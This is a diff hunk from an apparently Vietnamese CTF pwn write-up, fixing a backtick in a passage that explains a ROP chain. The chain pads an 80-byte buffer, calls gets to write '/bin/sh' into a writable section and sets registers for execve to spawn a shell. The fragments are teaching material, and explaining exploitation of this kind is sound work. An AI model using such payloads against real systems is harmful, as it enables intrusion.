@@ -108,7 +108,7 @@
 - Ghi chuỗi /bin/sh   
 `payload = b'A'`dùng để lấp đầy buffer `v8` 80 byte và saved-RBP 8 byte để trỏ tới Return address       
 `payload += p64(pop_rdi) + p64(rw_section)` đưa địa chỉ `rw_section` vào thanh ghi RDI (tham số thứ 1 của hàm`gets`)      
-`payload += p64(exe.sỵm['gets']) sẽ gọi hàm `gets`, khi hàm chạy thì nó sẽ chờ nhận đầu vào và ghi thẳng vào địa chỉ đang nằm trong RDI là `rw_section`   
+`payload += p64(exe.sỵm['gets'])` sẽ gọi hàm `gets`, khi hàm chạy thì nó sẽ chờ nhận đầu vào và ghi thẳng vào địa chỉ đang nằm trong RDI là `rw_section`   
 - Thực thi execve   
 `payload += p64(pop_rdi) + p64(rw_section)` nạp lại địa chỉ `rw_section` đang chứa chuỗi `/bin/sh` cho RDI   
 `payload += p64(pop_rsi) + p64(0)` Set RSI = 0   
